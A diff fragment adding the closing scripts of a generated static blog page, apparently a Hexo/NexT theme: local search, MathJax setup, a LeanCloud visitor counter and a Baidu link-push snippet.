+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("EAvSG3QtXW1dqzq5WQ5CjH7S-gzGzoHsz", "2aiWv7vIfVY4CjKc49aPBHFX");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+</body>
+</html>
